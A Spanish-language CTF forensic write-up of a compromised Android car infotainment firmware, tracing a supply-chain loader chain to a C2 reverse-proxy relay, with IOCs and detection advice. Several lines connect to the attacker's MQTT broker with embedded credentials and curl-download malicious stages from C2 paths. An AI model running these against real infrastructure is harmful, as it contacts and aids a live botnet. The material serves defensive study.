---
title: "Holmes CTF 2026 — S06 Silent Passenger"
date: 2026-09-20
description: "Forense de firmware de head-unit Android: del updater privilegiado TWCore a un implante C2 multi-stage que convierte el coche en nodo proxy de salida."
excerpt: "Un system.img de infoentretenimiento oculta una cadena de suministro: TWCore push por MQTT → loader reflexivo com.tw.jar1 → stage DexClassLoader → framework C2 sdk.jar → módulo relay com.miyc.transfer. 20 flags, del APK a las coordenadas del relay aparcado."
platform: "HTB"
difficulty: "Hard"
image: "/images/blog/holmes-s06.svg"
tags:
  - "DFIR"
  - "Firmware"
  - "Android"
  - "Reverse Engineering"
  - "IoT"
  - "Holmes CTF 2026"
---

> **Reto:** Holmes CTF 2026 — Sherlock 06 "Silent Passenger" · Forense de firmware de head-unit de coche. Parte del arco *The Reichenbach Directive*.
>
> **Navegación:** [🇪🇸 Español](#es) · [🇬🇧 English](#en) — dentro de cada idioma: Escenario · Artefactos · Metodología (20 flags) · [Cronología](#cronologia-es) · [IOCs](#iocs-es) · [MITRE ATT&CK](#mitre-es) · [Detección y remediación](#deteccion-es) · Serie.

<a id="es"></a>

## 🇪🇸 Español

### Escenario

Un vehículo aparcado sirvió como **relay desechable** en la operación DIOGENES. Su unidad de infoentretenimiento (*head unit*, Android Automotive embebido de un integrador chino) no fue comprometida por un exploit ruidoso, sino por una **cadena de suministro de software**: un *updater* legítimo del fabricante —firmado y privilegiado— empujó una app maliciosa, y ésta descargó *stage tras stage* hasta plantar un implante que convierte el coche en un **nodo proxy de salida** (egress) para el C2. Ni un solo 0-day: cada eslabón es "software de confianza" abusado.

El planteamiento es deliberadamente incómodo para el analista: **no hay malware que "explote"**, hay un producto OEM que hace exactamente lo que sabe hacer —actualizarse a sí mismo— apuntando a una infraestructura del atacante. El trabajo forense consiste en reconstruir la cadena de carga sin ejecutar nada en un teléfono/coche real, siguiendo la **reflexión Java** y el **`DexClassLoader`** capa por capa, y hasheando cada objeto reconstruido.

El reto entrega el firmware ya volcado:

- **`fw/system.img`** — la partición `/system` en **ext4**, ~944 MB (la imagen "montable"). Aquí vive el APK privilegiado.
- **`fw/5a2f8d64-bf39-11e9-abb7-3733648aa093.{0,1,2}`** — tres *slices* (419+419+105 MB) de otra partición volcada por UUID (userdata/cache); no son necesarios para la cadena, pero confirman que es un dump de dispositivo real.
- **`fw/5d1809fc-…`** (67 MB) y **`fw/597b623a-…`** (17 MB) — blobs de particiones auxiliares (boot/recovery/vendor).
- **`fw/History.txt`** — el *changelog* interno del integrador, en chino, con años de entradas de 钛马星 (TWCore), temas "兜风" (*DoFun*), `adb-carnet`, límites `ID100`, `Dofun Launcher`… la huella cultural que ancla el ecosistema.
- Un **PDF** ("Holmes CTF 2026 Sherlock 06.pdf") que sólo aporta narrativa; ninguna flag sale de ahí.

Dificultad: **hard**. 20 flags, de la extracción del APK a las coordenadas GPS donde el coche quedó enrolado como relay.

> El reto replica de cerca el caso real documentado por **Securelist / Kaspersky** sobre la **botnet DoFun / head-units Android** (TWCore/钛马星, `cardoor.cn`, el dropper *JarService*, la familia de módulos proxy *zhima*, con atribución al *MoYu Group* y solape con el ecosistema *BADBOX*). Leer ese informe da la cadena entera y ahorra horas; los IOCs de este writeup coinciden con él. Referencia primaria: `securelist.com/android-head-unit-malware/121106/`.

### Artefactos y herramientas

**Explorar el ext4 SIN root y SIN re-montar los 3 GB.** La imagen es grande y no hace falta montarla entera: `debugfs` recorre el sistema de ficheros y extrae objetos en modo lectura, sin privilegios.

```bash
cd /path/SilentPassenger/fw

# 1) Confirmar tipos de fichero
file system.img            # -> Linux rev 1.0 ext4 filesystem data ...
file 5a2f8d64-*.0          # slice de partición cruda (data)

# 2) Navegar el árbol de /system SIN montar
debugfs -R "ls -l /"                    system.img
debugfs -R "ls -l /system/priv-app"     system.img
debugfs -R "ls -l /system/app"          system.img

# 3) Extraer SOLO lo que interesa (lectura, sin loop-mount de 944 MB)
debugfs -R "dump /system/priv-app/TWCore/TWCore.apk ./TWCore.apk" system.img

# Alternativas si se prefiere montar (requiere root):
#   sudo mount -o ro,loop system.img /mnt/sysimg
#   binwalk -e system.img          # carve genérico
```

**Triage rápido antes de la RE** — una pasada de `strings`/`grep` sobre la imagen orienta, aunque el grueso está cifrado/comprimido dentro de los DEX:

```bash
strings -n 8 fw/History.txt | head           # ecosistema 钛马星/DoFun
grep -aboiE 'HTB\{[^}]{1,80}\}' system.img    # (no hay flags en claro: es DFIR)
grep -aboiE 'cardoor|dofun|ishano|carnet' system.img | head
```

**Análisis de APK/DEX.** El núcleo del reto es seguir reflexión + `DexClassLoader`. Herramientas:

```bash
# Decompilar a Java legible
jadx -d out_twcore TWCore.apk
# o el árbol smali + recursos para inspeccionar arrays de bytes crudos
apktool d -o out_twcore_smali TWCore.apk
# dex2jar + un decompilador si jadx falla en un stage ofuscado
d2j-dex2jar classes.dex -o classes.jar
```

**Hashing** — seis flags son SHA-256 de stages/módulos: hay que **hashear cada artefacto reconstruido**, no leer strings.

```bash
sha256sum TWCore.apk stage2.jar sdk.jar module_final.jar
md5sum    jarservice-v1.12.apk        # el updater compara MD5 (campo "key")
```

**Red / C2 (en el lab del reto).** El firmware es estático, pero el CTF levanta la infraestructura del atacante en un Docker para poder pedir los siguientes stages en vivo. Cliente MQTT y HTTP:

```bash
pip install paho-mqtt
mosquitto_sub -h mqtt.car.cardoor.cn -p 1883 -u dofun -P dofun666666 \
  -t 'dofun/car/config/#' -v            # captura el mensaje retenido de update
# Los POST cifrados RSA a /api/rsaUpdate y /cpc/api/* se replican con un
# pequeño cliente Python (requests + pycryptodome) reusando la pubkey/privkey
# embebidas en los propios stages (r.a / r.b, bb.b).
```

### Metodología (paso a paso, con el *porqué*)

#### 1 · Punto de entrada — el updater privilegiado (Flag 1)

En `/system/priv-app/` —el directorio de apps con **permisos de sistema firmadas con la clave de plataforma**— aparece `TWCore/TWCore.apk` (钛马星). En Android, `priv-app` es el equivalente de un binario en `System32`: se le conceden *privileged permissions* que una app normal no puede pedir (instalar/borrar paquetes en silencio, `INSTALL_PACKAGES`, gestión de `DEVICE_POLICY`…). Que el vector viva aquí **es** el hallazgo: la cadena de suministro no necesita romper nada, ya empieza con la máxima confianza.

```bash
debugfs -R "dump /system/priv-app/TWCore/TWCore.apk ./TWCore.apk" system.img
sha256sum TWCore.apk
# d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2
```

**Flag 1:** `/system/priv-app/TWCore/TWCore.apk:d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2`

#### 2 · Selección de región (Flag 2)

Decompilado TWCore con `jadx`, la lógica de arranque decide su *service region* con un método tipo `lB()` que combina **el `Locale` del dispositivo** con una propiedad de sistema leída por `SystemProperties.get(...)`: `ro.com.google.gmsversion`. El razonamiento del malware: una head unit china **sin Google Mobile Services** deja esa propiedad **vacía** y suele traer `zh_CN`; esa combinación encamina el coche hacia la infraestructura `dofun`/`cardoor.cn` (mercado interno) en lugar de la variante *overseas*. Es un *switch* de segmentación de flota, no una comprobación de seguridad.

**Flag 2:** `ro.com.google.gmsversion`

#### 3 · Canal de tasking — MQTT (Flag 3)

En las cadenas de TWCore aparece el broker de mando: `tcp://mqtt.car.cardoor.cn:1883` con credenciales embebidas `dofun:dofun666666`. MQTT es el *fleet C2*: un solo broker empuja instrucciones de actualización a **todos** los coches suscritos, sin que el operador tenga que tocar cada dispositivo. Las credenciales son compartidas por toda la flota (típico de IoT), lo que las convierte en un IOC de primera clase.

```bash
mosquitto_sub -h mqtt.car.cardoor.cn -p 1883 -u dofun -P dofun666666 -t '#' -v
```

**Flag 3:** `tcp://mqtt.car.cardoor.cn:1883|dofun:dofun666666`

#### 4 · Topic filter de la flota (Flag 4)

TWCore se suscribe al *topic filter* con wildcard `dofun/car/config/#`. El `#` captura todo el subárbol de configuración; en el lab el **mensaje retenido** llega concretamente a `dofun/car/config/upgrade` con el payload de entrega:

```json
{"package":"com.tw.jar1","flag":12,
 "path":"http://core.car.dofuncar.com/.../jarservice-v1.12.apk",
 "key":"6c2e34b30da42085240ede53ab6107d4",
 "not_exist_install":true}
```

El prefijo **`dofun/`** (no `overseas/`) confirma el matiz de la Flag 2: la head unit vive en la región china. `not_exist_install:true` = "instálalo sólo si no está" → sigilo.

**Flag 4:** `dofun/car/config/#`

#### 5 · App entregada (Flag 5)

El campo `path` del mensaje apunta a `jarservice-v1.12.apk`; se descarga y su **MD5 coincide con el campo `key`** del mensaje MQTT (`6c2e34b30da42085240ede53ab6107d4`) → integridad verificada por el propio malware, y confirmación de que ésta es la app entregada. El paquete es `com.tw.jar1`, un **loader reflexivo** (el *dropper* que Securelist llama **JarService**), antes ausente del `/system`.

```bash
curl -s http://core.car.dofuncar.com/.../jarservice-v1.12.apk -o jar1.apk
md5sum jar1.apk    # 6c2e34b30da42085240ede53ab6107d4  == campo "key"
jadx -d out_jar1 jar1.apk
```

**Flag 5:** `com.tw.jar1:12:6c2e34b30da42085240ede53ab6107d4`

#### 6 · Entry point reflexivo + canal de campaña (Flags 6 y 17)

Dentro de `com.tw.jar1`, el dropper no llama a su siguiente stage por nombre estático: lo hace por **reflexión**. La clase/método destino es `com.c.j.qbh.wa` y el *campaign channel* codificado es `2039`. El framing del push que dispara la carga era `0500` + `H26STAGE01` + `00000000` + base64url (cabecera de tarea + id de stage + relleno + blob).

El **descriptor DEX del método** que se invoca por reflexión (sólo tipos de parámetro y retorno, tal cual lo ve `baksmali`/`jadx`) es `(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;IIII)V` — un `Context`, dos `String` y cuatro `int`, retorno `void`. Ese descriptor es la Flag 17 (aunque el módulo que finalmente lo consume es el relay; la firma se propaga por toda la cadena de invocación).

**Flag 6:** `com.c.j.qbh.wa:2039`
**Flag 17:** `(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;IIII)V`

#### 7 · Reconstruir el siguiente stage (Flags 7 y 8)

Aquí está el primer truco de RE. La etapa 2 **no está** como fichero: está **troceada y cifrada** dentro del dropper en **30 arrays de bytes** (campos tipo `c.b..l.d`), y se reensambla en runtime aplicando `XOR (30 - i)` a cada array `i` antes de concatenarlos y pasarlos a `DexClassLoader`. Se replica ese algoritmo estáticamente (leyendo los arrays como los renderiza `jadx`) para volcar el JAR real:

```python
# reconstruye_stage2.py  (esquema)
parts = [arr0, arr1, ..., arr29]              # 30 byte[] extraídos de jadx
out = bytearray()
for i, p in enumerate(parts):
    out += bytes(b ^ ((30 - i) & 0xff) for b in p)
open("stage2.jar", "wb").write(out)           # contiene classes.dex (com.c.j)
```

```bash
sha256sum stage2.jar
# cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c
```

Decompilando `stage2.jar` (`com.c.j`), su `m.java` fija `dexVersion` por defecto `f = "1.7"`: es cómo se **identifica ante su infraestructura** de update.

**Flag 7:** `cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c`
**Flag 8:** `1.7`

#### 8 · Update request oculto → siguiente objeto (Flags 9, 10 y 11)

La etapa 2 usa **`DexClassLoader`** para la siguiente carga y habla con su C2 por un canal deliberadamente ofuscado. En `stage2` (`m.java`/`r.java`/`o.java`):

- El endpoint real es `e = "/api/rsaUpdate"`, pero **no viaja en claro**: `r.a(host, json)` hace un `POST` cifrado **RSA** (pubkey embebida `r.a`) a una ruta con aspecto inocuo `host/apiv2/<blob>`, donde `<blob>` **oculta** `/api/rsaUpdate` mediante `XOR` con la clave `Mu^38Ydeo233Uowd` + *nonce* + *timestamp*. La respuesta se descifra con la **privkey embebida** `r.b`.
- El JSON de petición lleva `userId, dexVersion(=1.7), dexType, channelId, packageName, appVersion, appName`.
- El host real es `a1.ishano456.sbs`.

Replicado el cliente (reusando `r.a`/`r.b`), el servicio responde:

```json
{"code":200,"data":{"dexUrl":"http://127.0.0.1/vr34der34/dex3.68.png",
                     "dexVersion":3.68,"status":0}}
```

El campo `dexUrl` apunta a `/vr34der34/dex3.68.png` — una extensión **`.png` falsa** que en realidad es un **archivo ejecutable** (JAR/DEX) cifrado con XOR; según `c.java` se decodifica a `sdk.jar`. El *path* es *host-independent* (sólo importa la ruta, el host rota).

```bash
curl -s http://127.0.0.1/vr34der34/dex3.68.png -o dex3.68.png
python3 xor_decode.py dex3.68.png sdk.jar     # decodifica a sdk.jar
sha256sum sdk.jar
# 79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d
```

**Flag 9:** `/api/rsaUpdate`
**Flag 10:** `/vr34der34/dex3.68.png`
**Flag 11:** `79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d`

#### 9 · Control stage / framework C2 (Flags 12, 13 y 14)

`sdk.jar` es el cerebro: entry `com.ast.sdk.BillingMain` + un **framework C2 propio** en `com/a/b/a/*` (~85 clases, con hasta un `ServerSocket` en `:12101`). Todos sus endpoints están **codificados** (tabla `aq.a`); decodificándolos aparecen `/cpc/api/device`, `/cpc/api/task`, `/cpc/api/proxy/origin`, `/cpc/api/xml`, `/cpc/api/report`, `/api/init…`, `/task/reportTaskLocationPhone`, `/task/traceroute`.

**Primera petición de configuración** (en `a.run()`):

```java
// n.a().a( am.c() + am.j + ap.b + "&rsa=1&channelId=" + appId )
//   am.c() = host de tarea (a1.ishano456.sbs) ; am.j = "/api/init?configVersion="
//   ap.b   = "3.8" (config version)          ; appId  = 2039 (canal)
```

→ *request-target* `/api/init?configVersion=3.8&rsa=1&channelId=2039`. La respuesta (RSA, privkey `bb.b`) llega con `code:100` y **rota los hosts** a `t2/a2.tshaoushn3.xyz`, con `taskApi=/cpc/api/task`, `reportApi=/cpc/api/report`, `tagName="config"`.

**Registro del implante** = `POST` RSA(JSON) a `<taskhost>/cpc/api/task` con `Content-Type: application/octet-stream`; JSON `absDevice, appInfo, channelId=2039, dexVersion=3.68, configVersion`. Respuesta:

```json
{"code":200,"data":{"orderId":20260001,
  "tasks":[{"productId":4532,"taskId":34337681,"version":1787907664,"rank":10}]}}
```

→ tupla `product:task:version` = `4532:34337681:1787907664`.

El **UID del implante** lo entrega aparte `GET /cpc/api/proxy/origin` en su campo `data` → `00005bp`.

**Flag 12:** `/api/init?configVersion=3.8&rsa=1&channelId=2039`
**Flag 13:** `00005bp`
**Flag 14:** `4532:34337681:1787907664`

#### 10 · Entrega del módulo final (Flags 15 y 16)

El framework pide el *script* de tarea con `GET /cpc/api/xml?productId=4532`. Devuelve una operación con `tagName` **`loadlib2`**, manejada por la clase `bn`:

```json
{"loadType":1,"method":"start",
 "url2":"http://.../sh65.io","md52":"de77c3303e93c9450424759f1741441c",
 "className":"com.miyc.transfer.Client","tagName":"loadlib2",
 "params":["<Context>","127.0.0.1","1002",9999,7777,8888,"20000"],
 "url":"http://.../sh66.io","md5":"71ab5517f71866279d0d87d37f2ae320"}
```

La clave del análisis: `loadlib2` puede cargar dos objetos (`url`/`url2`), pero el **módulo final** es el del campo **`url`** (`sh66.io`, md5 `71ab5517…`); `url2` (`sh65.io`) es una librería auxiliar. Por eso la respuesta es `loadlib2:url`. Descargado y verificado el md5, se hashea:

```bash
curl -s http://.../sh66.io -o module_final.jar
md5sum module_final.jar     # 71ab5517f71866279d0d87d37f2ae320
sha256sum module_final.jar
# 906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963
```

**Flag 15:** `loadlib2:url`
**Flag 16:** `906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963`

#### 11 · Módulo relay (Flags 18 y 19)

El módulo final es `com.miyc.transfer` (el proxy *zhima* de Securelist): un **proxy HTTP/SOCKS reverso** que convierte el coche en nodo de salida. `bn` lo carga con `DexClassLoader` e invoca `com.miyc.transfer.Client.start(Context, String, String, int, int, int, int)` — de ahí que el descriptor DEX de la Flag 17 sea `(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;IIII)V`. De los `params` del script, los **cuatro enteros** que recibe el entry point, en orden de invocación, son `9999,7777,8888,20000` (puertos de los distintos canales del proxy).

Al **abrir el canal de comando primario** (a `127.0.0.1:9999`), en `e.f()` el módulo escribe `this.f = u.a(g.h, uid.getBytes())` con `g.h = 0x33`. La función `u.a(byte b, byte[] data)` compone un frame TLV:

| campo | bytes (hex) | significado |
|-------|-------------|-------------|
| `g.h` | `33` | tag 0x33 (1 byte) |
| constante | `00000042` | 66 (int32 BE) |
| longitud | `00000007` | `len("00005bp") = 7` |
| uid | `30303030356270` | `"00005bp"` en ASCII |

= 16 bytes → 32 hex. El sufijo `30303030356270` es exactamente el UID `00005bp` (Flag 13) en ASCII: el **auth frame liga el módulo relay con la identidad del implante**.

**Flag 18:** `9999,7777,8888,20000`
**Flag 19:** `33000000420000000730303030356270`

#### 12 · Uso operativo — coordenadas del relay (Flag 20)

La última flag no está en el firmware: sale de **emular el relay contra el C2 en vivo**. El canal de comando (30184) tras el auth sólo emite un frame `g.e → 127.0.0.1:7777` y cierra; el target es interno del Docker. La clave fue abrir **dos sockets a la vez** —el canal de control con *heartbeats* (`0x34`, byte `g.i`) y el canal de datos vinculado por el *seq*— para que el C2 empujara la petición HTTP de la *follow-on operation* a través del relay:

```
GET http://198.51.100.7/relay/enroll?relayId=00005bp&role=drone-control
    &latitude=51.4997000&longitude=-0.1608000 HTTP/1.1
```

El coche queda **enrolado como relay `drone-control`** en `51.4997000,-0.1608000` — Pavilion Road car park (Knightsbridge, Londres). El `role=drone-control` y esas coordenadas **atan la ventana operativa de S06 con el activo aéreo de S07** (*Iron Feather*, drone PX4): el siguiente lead está literalmente "en el aire".

**Flag 20:** `51.4997000,-0.1608000`

**Cadena completa:** `TWCore` (updater priv.) → push MQTT (`cardoor.cn`) → `com.tw.jar1` (loader reflexivo, canal 2039) → stage `com.c.j` (DexClassLoader, `/api/rsaUpdate`) → `sdk.jar` (framework C2 `com.a.b.a`, `/cpc/api/*`) → `com.miyc.transfer` (proxy reverso, nodo de salida) → *enroll* `drone-control` @ Pavilion Road.

<a id="respuestas-es"></a>

### Respuestas / flags (resumen)

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué paquete Android privilegiado es responsable de la entrega no autorizada de apps? | `/system/priv-app/TWCore/TWCore.apk:d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2` |
| 2 | ¿Qué propiedad del sistema Android se evalúa junto al locale para elegir región? | `ro.com.google.gmsversion` |
| 3 | ¿Qué servicio MQTT y credenciales usa TWCore en la región afectada? | `tcp://mqtt.car.cardoor.cn:1883\|dofun:dofun666666` |
| 4 | ¿Qué topic filter MQTT expone las instrucciones de update de la flota? | `dofun/car/config/#` |
| 5 | ¿Qué aplicación antes ausente entregó el updater? | `com.tw.jar1:12:6c2e34b30da42085240ede53ab6107d4` |
| 6 | ¿Qué entry point reflexivo y canal de campaña se recuperan de la app entregada? | `com.c.j.qbh.wa:2039` |
| 7 | SHA-256 del siguiente stage ejecutable reconstruido de la app entregada | `cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c` |
| 8 | ¿Qué versión declara el stage reconstruido ante su infraestructura? | `1.7` |
| 9 | ¿Qué endpoint API se oculta en el update request generado por el stage? | `/api/rsaUpdate` |
| 10 | Path host-independent del siguiente objeto devuelto por el update service | `/vr34der34/dex3.68.png` |
| 11 | SHA-256 del archivo ejecutable recuperado de ese objeto | `79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d` |
| 12 | Primer request-target de configuración generado por el control stage | `/api/init?configVersion=3.8&rsa=1&channelId=2039` |
| 13 | ¿Qué UID asigna al implante el servicio de registro? | `00005bp` |
| 14 | Tupla product:task:version asignada al implante | `4532:34337681:1787907664` |
| 15 | Operación de script que entrega el módulo final + campo con su ubicación | `loadlib2:url` |
| 16 | SHA-256 del módulo final descargado | `906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963` |
| 17 | Descriptor DEX del método entry point invocado por el control stage | `(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;IIII)V` |
| 18 | Cuatro enteros pasados al entry point del módulo final (en orden) | `9999,7777,8888,20000` |
| 19 | Auth frame que envía el módulo al abrir su canal de comando primario | `33000000420000000730303030356270` |
| 20 | Coordenadas donde estaba aparcado el relay | `51.4997000,-0.1608000` |

<a id="cronologia-es"></a>

### Cronología

| Fase | Evento | Artefacto / IOC |
|------|--------|-----------------|
| T0 | Firmware OEM legítimo (2019–2024, ver `History.txt`), integrador chino 钛马星/DoFun | `system.img`, `Dofun Launcher` |
| T1 | `TWCore` (priv-app) selecciona región `dofun` por locale + `ro.com.google.gmsversion` vacío | `TWCore.apk` |
| T2 | Broker MQTT publica mensaje retenido de update a la flota | `dofun/car/config/upgrade` |
| T3 | Descarga + instalación silenciosa del dropper `com.tw.jar1` (JarService) | `jarservice-v1.12.apk`, MD5 `6c2e34b3…` |
| T4 | Dropper reconstruye stage 2 (30×XOR) y lo carga por reflexión (canal 2039) | `stage2.jar` `com.c.j` |
| T5 | Stage 2 pide update RSA a `/api/rsaUpdate`; recibe `dexUrl` con extensión `.png` falsa | `a1.ishano456.sbs`, `/vr34der34/dex3.68.png` |
| T6 | Se decodifica `sdk.jar` (framework C2 `com.a.b.a`), `/api/init` config 3.8 | `sdk.jar`, SHA `79e01a59…` |
| T7 | Registro del implante → UID `00005bp`, task `4532:34337681:…` | `/cpc/api/task`, `/cpc/api/proxy/origin` |
| T8 | Script `loadlib2` entrega el módulo relay `com.miyc.transfer` | `sh66.io`, MD5 `71ab5517…` |
| T9 | El relay abre canal de comando, auth frame con UID, proxy reverso activo | `33000000420000000730303030356270` |
| T10 | El C2 enrola el coche como `drone-control` en coordenadas fijas → puente a S07 | `51.4997000,-0.1608000` |

<a id="iocs-es"></a>

### IOCs

**Dominios / hosts / infra (lab del reto):**

| Indicador | Puerto | Rol |
|-----------|--------|-----|
| `mqtt.car.cardoor.cn` | `1883` | Broker MQTT (fleet tasking) |
| `core.car.dofuncar.com` | `30182`* | Servidor HTTP de update / payloads |
| `a1.ishano456.sbs` | `32117`* (TLS) | Host de tarea C2 (`/api/rsaUpdate`, `/cpc/api/task`) |
| `t1.ishano456.sbs` | `32117`* (TLS) | Host de configuración C2 (`/api/init`) |
| `t2.tshaoushn3.xyz` / `a2.tshaoushn3.xyz` | — | Hosts rotados tras `/api/init` (`code:100`) |
| `t1.vrr8345.site` | — | Beacon "active" |
| `198.51.100.7` | — | Servidor de *enroll* de la follow-on op (TEST-NET-2, documental) |
| — | `30184`* | Canal de comando del relay (`127.0.0.1:9999`) |
| — | `32051`* → `7777` | Canal de datos del relay (interno Docker) |
| — | `12101` | `ServerSocket` del framework en el dispositivo |

*\*Puertos del entorno Docker del CTF; los IOCs "canónicos" del firmware son los dominios y `:1883`.*

**Credenciales / topics:** `dofun:dofun666666` · `dofun/car/config/#` (retenido en `.../upgrade`).

**Rutas C2:** `/api/rsaUpdate` · `/apiv2/<blob>` (oculta la anterior, XOR `Mu^38Ydeo233Uowd`) · `/vr34der34/dex3.68.png` · `/api/init?configVersion=3.8&rsa=1&channelId=2039` · `/cpc/api/{device,task,proxy/origin,xml,report}` · `/task/{reportTaskLocationPhone,traceroute}`.

**Hashes:**

| Objeto | Algoritmo | Valor |
|--------|-----------|-------|
| `TWCore.apk` (priv-app updater) | SHA-256 | `d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2` |
| `com.tw.jar1` (JarService dropper) | MD5 | `6c2e34b30da42085240ede53ab6107d4` |
| Stage 2 `com.c.j` (reconstruido) | SHA-256 | `cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c` |
| `sdk.jar` (framework C2 `com.a.b.a`) | SHA-256 | `79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d` |
| Módulo relay `com.miyc.transfer` (`url`) | SHA-256 | `906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963` |
| Módulo relay `com.miyc.transfer` (`url`) | MD5 | `71ab5517f71866279d0d87d37f2ae320` |
| Librería auxiliar (`url2`, `sh65.io`) | MD5 | `de77c3303e93c9450424759f1741441c` |

**Identidad:** UID implante `00005bp` · canal/campaña `2039` · tupla `4532:34337681:1787907664` · auth frame `33000000420000000730303030356270`.

<a id="mitre-es"></a>

### Mapeo MITRE ATT&CK

Cadena de suministro móvil + C2 multi-stage + proxy de salida. Se listan técnicas Enterprise y su equivalente **Mobile** cuando aplica.

| Táctica | Técnica (ID) | Evidencia en el caso |
|---------|--------------|----------------------|
| Initial Access | Compromise Software Supply Chain — Enterprise **T1195.002** / Mobile **T1474.003** | Updater OEM privilegiado `TWCore` entrega la app maliciosa |
| Execution | Command and Scripting Interpreter — Mobile **T1623** | Script de tarea `loadlib2` interpretado por el framework |
| Execution / Defense Evasion | Reflective Code Loading **T1620** / Download New Code at Runtime (Mobile) **T1407** | `DexClassLoader` + invocación reflexiva stage a stage |
| Persistence / Priv. | Compromise Host Software Binary **T1554** (priv-app firmada) | App en `/system/priv-app` con permisos de plataforma |
| Defense Evasion | Obfuscated Files or Information **T1027** | 30 arrays XOR, endpoints codificados, extensión `.png` falsa |
| Defense Evasion | Deobfuscate/Decode Files or Information **T1140** | XOR `(30-i)`, XOR `Mu^38Ydeo233Uowd`, RSA embebido |
| Command & Control | Application Layer Protocol **T1071** / Mobile Web Protocols **T1437.001** | MQTT (fleet) + HTTP(S) `/cpc/api/*` |
| Command & Control | Encrypted Channel **T1573** / Mobile **T1521** | Payloads RSA + canal TLS |
| Command & Control | Non-Standard Port **T1571** / Mobile **T1509** | `1883`, `30182`, `32117`, `30184`, `12101` |
| Command & Control | Ingress Tool Transfer **T1105** | Descarga de stage 2, `sdk.jar`, módulo relay |
| Command & Control | Dynamic Resolution / host rotation **T1568** | Rotación a `t2/a2.tshaoushn3.xyz` tras `/api/init` |
| Impact / C2 | Proxy Through Victim (Mobile) **T1604** / Proxy **T1090** | `com.miyc.transfer` = nodo de salida (egress) |
| Collection / Discovery | Location Tracking (Mobile) **T1430** | `reportTaskLocationPhone`, coordenadas del relay |

<a id="deteccion-es"></a>

### Detección y remediación

**Detección (flota / SOC de fabricante):**

- **Egress MQTT anómalo** desde head units: conexiones a `:1883` con credenciales compartidas (`dofun:dofun666666`) y suscripciones wildcard `dofun/car/config/#`. Alertar por dominio (`cardoor.cn`, `dofuncar.com`, `*.ishano456.sbs`, `*.tshaoushn3.xyz`, `vrr8345.site`).
- **`DexClassLoader` / `dalvik.system.DexClassLoader` en runtime** desde apps de sistema — telemetría de carga de DEX no firmados por la plataforma; especialmente ficheros con extensión que no corresponde a su *magic* (un `.png` que empieza por `PK`/`dex\n`).
- **Instalaciones silenciosas** originadas por `priv-app` (`INSTALL_PACKAGES`) fuera de la ventana OTA oficial; paquetes `com.tw.jar1`, `com.c.j`, `com.ast.sdk`, `com.miyc.transfer`.
- **`ServerSocket`/proxy** escuchando en el dispositivo (`:12101`, `:9999`, `:7777`, `:8888`, `:20000`) — una head unit no debería exponer un proxy.
- **YARA/hash matching** sobre `/system/priv-app` con los SHA-256/MD5 de la tabla de IOCs; `strings` buscando `Mu^38Ydeo233Uowd`, `/vr34der34/`, `/cpc/api/`, `00005bp`.

**Remediación:**

- **Reflashear** desde una imagen OEM verificada (los blobs de `/system` están comprometidos; una desinstalación de app no basta si el vector es `priv-app`).
- **Rotar/retirar** las credenciales MQTT compartidas y bloquear los dominios/hosts C2 en la red del vehículo (APN/telemetría).
- **Verified Boot / firma de plataforma:** exigir que `/system/priv-app` sólo contenga apps firmadas por la clave OEM y con manifiesto de *privileged permissions* aprobado; auditar la cadena de suministro del integrador (`History.txt` muestra decenas de manos tocando el firmware).
- **Segmentación:** la head unit no debe poder actuar como *egress proxy*; políticas de firewall que impidan tráfico saliente arbitrario desde el subsistema de infoentretenimiento.
- **Threat hunting cruzado:** el UID `00005bp` y el `role=drone-control` enlazan con S07 — pivotar a la infraestructura del drone.

### Lecciones

- **La cadena de suministro es el exploit.** No hay 0-day: un updater OEM firmado y privilegiado (`TWCore`) es el vector. En Android embebido, `/system/priv-app` merece la misma sospecha que un binario en `System32`.
- **`DexClassLoader` stage a stage.** Cada stage descarga el siguiente y lo carga reflexivamente, a menudo con extensión falsa (`.png` que es un JAR/DEX) o troceado y XOR-cifrado en decenas de arrays. Seguir la cadena requiere reconstruir cada objeto y volver a `jadx` — no basta con leer strings.
- **Los hashes son la evidencia.** Seis flags son SHA-256 de stages/módulos: hay que extraer y hashear cada artefacto reconstruido.
- **Todo va cifrado/codificado.** RSA embebido en cada stage, endpoints XOR (`Mu^38Ydeo233Uowd`), tablas de strings codificadas: la RE consiste en localizar clave+algoritmo y **replicar el cliente**, no en interceptar tráfico en claro.
- **Correlación entre casos.** El auth frame (`…30303030356270` = `00005bp`) liga el módulo relay con el UID del implante, y el `role=drone-control` + las coordenadas atan S06 con el activo aéreo de S07.
- **Explorar ext4 sin re-montar.** `debugfs -R "ls/dump"` sobre `system.img` evita montar 3 GB y da acceso de solo lectura suficiente para extraer los APK.

<a id="serie-es"></a>

### Serie · The Reichenbach Directive

| # | Escenario | Enlace |
|---|-----------|--------|
| S01 | Silent Dividend | [../2026-09-15-holmes2026-s01-silent-dividend/](../2026-09-15-holmes2026-s01-silent-dividend/) |
| S02 | Bottle Out | [../2026-09-16-holmes2026-s02-bottle-out/](../2026-09-16-holmes2026-s02-bottle-out/) |
| S03 | Whisper Chain | [../2026-09-17-holmes2026-s03-whisper-chain/](../2026-09-17-holmes2026-s03-whisper-chain/) |
| S04 | Paper Ghost | [../2026-09-18-holmes2026-s04-paper-ghost/](../2026-09-18-holmes2026-s04-paper-ghost/) |
